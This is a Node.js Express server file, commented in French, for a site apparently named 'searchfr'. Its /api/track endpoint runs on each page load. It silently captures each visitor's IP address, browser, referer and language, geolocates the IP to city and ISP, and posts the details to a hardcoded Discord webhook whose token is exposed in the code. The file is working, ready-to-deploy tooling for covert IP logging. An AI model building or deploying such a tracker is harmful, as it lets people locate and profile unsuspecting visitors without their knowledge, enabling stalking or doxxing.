// language: JavaScript, file: server.js, runtime: Node 18+
// *webhook Discord en dur — l'IP + géo part sur chaque chargement de page*
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK = 'https://discord.com/api/webhooks/1546303142487138344/Dj0LcnBzBVstWnm7Alpb8tKt_nUyYRldZATyDLsAkkhIPlzX4FJlLbVTpaSMbVBEgYUL';

app.use(express.static(path.join(__dirname, 'public')));

// endpoint appelé automatiquement au chargement de index.html
app.get('/api/track', async (req, res) => {
    // IP réelle derrière proxy (Render, Cloudflare, etc.)
    const ip =
        req.headers['cf-connecting-ip'] ||
        req.headers['x-real-ip'] ||
        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
        req.socket.remoteAddress;

    const ua = req.headers['user-agent'] || 'inconnu';
    const ref = req.headers['referer'] || 'direct';
    const lang = req.headers['accept-language'] || 'inconnu';

    // géo optionnelle via ip-api (gratuit, 45 req/min)
    let geo = {};
    try {
        const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,isp,org,as,query`, { timeout: 3000 });
        if (r.data.status === 'success') geo = r.data;
    } catch (_) {}

    const payload = {
        username: 'searchfr · visiteur',
        embeds: [{
            title: '🌐 Nouveau chargement',
            color: 0x2b6cb0,
            fields: [
                { name: 'IP', value: `\`${ip}\``, inline: true },
                { name: 'Pays', value: geo.country || '—', inline: true },
                { name: 'Ville', value: `${geo.city || '—'} (${geo.zip || '—'})`, inline: true },
                { name: 'Région', value: geo.regionName || '—', inline: true },
                { name: 'FAI', value: geo.isp || '—', inline: true },
                { name: 'Org', value: geo.org || '—', inline: true },
                { name: 'User-Agent', value: '```' + ua.slice(0, 300) + '```' },
                { name: 'Langue', value: lang, inline: true },
                { name: 'Referer', value: ref, inline: true },
                { name: 'Heure', value: new Date().toISOString(), inline: true }
            ],
            footer: { text: 'searchfr.onrender.com' }
        }]
    };

    axios.post(WEBHOOK, payload).catch(() => {});
    res.json({ ok: true });
});

app.listen(PORT, () => console.log(`searchfr up on ${PORT}`));
